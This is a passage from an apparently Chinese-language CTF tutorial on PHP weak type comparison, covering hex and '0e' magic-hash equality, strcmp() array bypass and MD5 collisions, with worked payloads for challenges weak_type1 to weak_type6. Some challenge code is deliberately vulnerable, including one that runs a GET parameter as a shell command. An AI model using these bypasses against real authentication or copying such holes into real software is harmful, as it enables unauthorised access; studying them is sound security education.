class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Wrong'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ord() 函数返回字符串的首个字符的 ASCII 值。</p></blockquote><p>这道题的意思就是要求输入一个key，然后这个key必须等于<code>54975581388</code>，但是在自定义的函数里面又不允许出现数字1到9，正好<code>54975581388=0xccccccccc</code>这样就绕过了检测。</p><p><strong>“0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0x1e240</span> <span class="token operator">==</span> <span class="token number">123456</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">54975581388</span> <span class="token operator">==</span> <span class="token number">0xccccccccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bool(true)<br>bool(true)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?a&#x3D;0xccccccccc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="hash值和字符串“0”比较"><a href="#hash值和字符串“0”比较" class="headerlink" title="hash值和字符串“0”比较"></a>hash值和字符串“0”比较</h3><p>在比较的时候，当出现xex模式，将会当做科学计数法进行比较。</p><p>而<strong>只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即<code>0e\d+</code>的字符串 == ‘0’ 为true。</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s224534898e"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a1b2edaced'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>0cc175b9c0f1b6a831c399e269772661<br>bool(false)<br>0e420233178946742799316739797882<br>bool(true)<br>0e45ea817f33691a3dd1f46af81166c4<br>bool(false)</p></blockquote><br><h3 id="PHP-组合比较运算符"><a href="#PHP-组合比较运算符" class="headerlink" title="PHP 组合比较运算符"></a>PHP 组合比较运算符</h3><p>组合比较运算符，符号为：&lt;=&gt;</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">&lt;=></span> <span class="token variable">$b</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相当于</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">></span> <span class="token variable">$b</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span> <span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>当 $a &gt; $b 时，$c = 1</li><li>当 $a == $b 时，$c = 0</li><li>当 $a &lt; $b 时，$c = -1</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">&lt;=></span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>-1</p></blockquote><p>组合比较运算符同样存在 == 弱类型比较问题，原理同 <strong>“==”与“===”</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0e12'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0e34'</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">&lt;=></span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>0</p></blockquote><br><h3 id="PHP-strcmp-函数"><a href="#PHP-strcmp-函数" class="headerlink" title="PHP strcmp() 函数"></a>PHP strcmp() 函数</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">int</span> <span class="token function">strcmp </span><span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$str1</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$str2</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据ACSII表进行比较，从左到右依次进行，出现不同就停止比较，返回结果。</p><p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 二进制安全比较字符串（区分大小写）</span><span class="token keyword">echo</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hello'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>-1</p><p>因为’H’的ASCII值比’h’的小，所以返回负数</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token string double-quoted-string">"***"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Wrong"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。</strong></p><pre class="line-numbers language-none"><code class="language-none">?password[]&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="weak-type1"><a href="#weak-type1" class="headerlink" title="weak_type1"></a>weak_type1</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token operator">==</span><span class="token number">520</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;?o&#x3D;520a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="weak-type3"><a href="#weak-type3" class="headerlink" title="weak_type3"></a>weak_type3</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">noother_says_correct</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$one</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nine</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>          <span class="token variable">$digit</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">&#123;</span><span class="token variable">$i</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">>=</span> <span class="token variable">$one</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">&lt;=</span> <span class="token variable">$nine</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$number</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'54975581388'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">noother_says_correct</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'access denied'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;?key&#x3D;0xccccccccc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="weak-type4"><a href="#weak-type4" class="headerlink" title="weak_type4"></a>weak_type4</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span>    <span class="token keyword">print</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="weak-type5"><a href="#weak-type5" class="headerlink" title="weak_type5"></a>weak_type5</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$logined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"login failed!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>isset()  检测变量是否设置</p><p>ctype_alpha函数功能就是检测是否是字符</p><p>is_numeric 检测变量是否为数字或数字字符串</p></blockquote><p>username必须是字母，password必须是数字，再将传入的username和password进行md5加密后进行比较且结果要相等。</p><p>如果md5加密后的值是0e开头，这样就存在弱类型比较问题就可以通过，所以要想得到flag，得寻找纯字母和纯数字md5加密后是0e开头的值。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>bool(true)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?username&#x3D;QNKCDZO&amp;password&#x3D;240610708<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="weak-type6"><a href="#weak-type6" class="headerlink" title="weak_type6"></a>weak_type6</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试使用<strong>weak_type4</strong>的<code>a[]=1&amp;b[]=2</code>，发现不行，测试后发现数组被强制装换为字符串后都是Array</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"a="</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"b="</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>a=Array</p><p>b=Array</p></blockquote><p>参考<a href="https://blog.csdn.net/weixin_41185953/article/details/83786862">MD5碰撞</a>后，用burp suite抓包</p><p><img src="https://s1.ax1x.com/2020/10/29/BYSB1H.png"></p><p><img src="https://s1.ax1x.com/2020/10/29/BYS5cj.png"></p><p><code>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></p><br><h3 id="天融信面试题"><a href="#天融信面试题" class="headerlink" title="天融信面试题"></a>天融信面试题</h3><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;html&gt;&lt;body&gt; &lt;form action&#x3D;&quot;index.php&quot; class&#x3D;&quot;authform&quot; method&#x3D;&quot;post&quot; accept-charset&#x3D;&quot;utf-8&quot;&gt;        &lt;fieldset&gt;            &lt;legend&gt;Unbreakable Random&lt;&#x2F;legend&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;s&quot; name&#x3D;&quot;s&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;seed&quot; &#x2F;&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;h&quot; name&#x3D;&quot;h&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;hash&quot; &#x2F;&gt;            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot; &#x2F;&gt;        &lt;div class&#x3D;&quot;return-value&quot; style&#x3D;&quot;padding: 10px 0&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt;        &lt;&#x2F;fieldset&gt;        &lt;&#x2F;form&gt;&lt;?phpfunction gen_secured_random() &#123; &#x2F;&#x2F; cause random is the way    $a &#x3D; rand(1337,2600)*42;    $b &#x3D; rand(1879,1955)*42;    $a &lt; $b ? $a ^&#x3D; $b ^&#x3D; $a ^&#x3D; $b : $a &#x3D; $b;    return $a+$b;&#125;function secured_hash_function($plain) &#123; &#x2F;&#x2F; cause md5 is the best hash ever    $secured_plain &#x3D; sanitize_user_input($plain);    return md5($secured_plain);&#125;function sanitize_user_input($input) &#123; &#x2F;&#x2F; cause someone told me to never trust user input    $re &#x3D; &#39;&#x2F;[^a-zA-Z0-9]&#x2F;&#39;;    $secured_input &#x3D; preg_replace($re, &quot;&quot;, $input);    return $secured_input;&#125;if (isset($_GET[&#39;source&#39;])) &#123;    show_source(__FILE__);    die();&#125;require_once &quot;secret.php&quot;;if (isset($_POST[&#39;s&#39;]) &amp;&amp; isset($_POST[&#39;h&#39;])) &#123;    $s &#x3D; sanitize_user_input($_POST[&#39;s&#39;]);    $h &#x3D; secured_hash_function($_POST[&#39;h&#39;]);    $r &#x3D; gen_secured_random();    if($s !&#x3D; false &amp;&amp; $h !&#x3D; false) &#123;        if($s.$r &#x3D;&#x3D; $h) &#123;            print &quot;Well done! Here is your flag: &quot;.$flag;        &#125;        else &#123;            print &quot;Fail...&quot;;        &#125;    &#125;    else &#123;        print &quot;&lt;p&gt;Hum ...&lt;&#x2F;p&gt;&quot;;    &#125;&#125;?&gt;&lt;p&gt;&lt;em&gt;&lt;a href&#x3D;&quot;index.php?source&quot;&gt;source code&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" 